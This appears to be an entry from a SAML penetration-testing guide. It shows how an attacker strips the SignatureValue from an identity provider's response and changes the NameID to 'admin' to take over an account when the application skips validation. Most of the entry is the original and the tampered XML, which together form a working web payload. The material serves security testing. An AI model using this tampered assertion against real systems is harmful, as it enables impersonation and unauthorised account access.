
###  Signature removal - The web application is not checking if value in Signature elements is present
<hr>

In this test case, an attacker just remove the value of Signature (not element itself).
The IDP will sign the SAML response and specift the signature in below mentioned element:

    <ds:SignatureValue></ds:SignatureValue> 
<hr>

#### Attack scenario:
This attack is based on the fact that when there is no signature value present in SAML response, the web application is not going to perform validation at all.
in this case, an attacker will remove the signature value and modify the Subject to perform account takeover.

The below mentioned is sample containing signature and subject returnd by an IDP:

    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_448b5c10-df72-013b-7684-0242ac100009">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>8lJpk95uugFQhcvvE7ZcK+ApIBEBojnyrmIirUTlkBM=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>N7dlB78xsS/7PhSyotdaYH2rsX+4kE+O5G1OiNgDv6wbqqZVr1l0zZQLrrw5RYLe3fRHS/0wvqYDJpco348nWk0xTVX3COpd2eq3Hxp7//go1lSFT7AZsVIWkdFKZ8ZNjWWh+PShDy9x4/vcYYjywB/+OCvI96s0RQmGcyTJU6yRbyayUqqOYi90lPNkVChtYp8ioLAxW+mAqovNaDXXCZCmuuuKXZnguKs0wZI/x33leleESYMJ7GqlcVMTEcRUVrARkCGpPRony52ugk+dxyG9vVe6drBnOhw4rl75xDFpnFniPMh1tqpBfz2j5IY2AS1o0F2G7NzaV/hSyvHmJ6Fa/8QRnw3nT5EU9DYpQxByaphlO0zIANO9mBaTqsWk7wI4CA210g3yKwGiX1Vfp6pMmKbk2yUaSh0F/jZdRUEJPW/ACBEFW5G4cjkbYzYu0jVfW6JfnKrrt7pZfLjP3IqZfMIZv/GGx8TQTfar7k/eH7CbNJY9NygdyK0aeBOC3Ld944kP8eGhJiITOiU2TlKWhbf1o/GDOMZkF+KClZvdE64taoUmpYaJPTdfelifPWp7aRx4YSj+WnR02UZNdnyZNlBHFU/Okxw6gnEnvN1y/mGvUIkdEPkyU2FiwUvG/weKUV5BFa0lvpQW67RxfuIb88WQB9bzD3VRF6ouvaY=</ds:SignatureValue>
      <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
        <ds:X509Data>
          <ds:X509Certificate>BASE64_ENCODED_VALUE</ds:X509Certificate>
        </ds:X509Data>
      </KeyInfo>
    </ds:Signature>
    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">test@test.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData
          InResponseTo="_b1c0681f-715f-45dd-8fbd-c8fe36d1ca87"
          NotOnOrAfter="2023-05-28T10:45:29Z" Recipient="http://web_app/saml/consume"/>
      </SubjectConfirmation>
    </Subject>
    
Now, an attacker will need to remove the signature value and modify the Name Identifier in Subject. 

The modified SAML response will look like this:  

    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_448b5c10-df72-013b-7684-0242ac100009">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>8lJpk95uugFQhcvvE7ZcK+ApIBEBojnyrmIirUTlkBM=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue/>
      <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
        <ds:X509Data>
          <ds:X509Certificate>BASE64_ENCODED_VALUE</ds:X509Certificate>
        </ds:X509Data>
      </KeyInfo>
    </ds:Signature>
    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">admin@TEST.COM</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData
          InResponseTo="_b1c0681f-715f-45dd-8fbd-c8fe36d1ca87"
          NotOnOrAfter="2023-05-28T10:45:29Z" Recipient="http://WEB_APP/saml/consume"/>
      </SubjectConfirmation>
    </Subject>
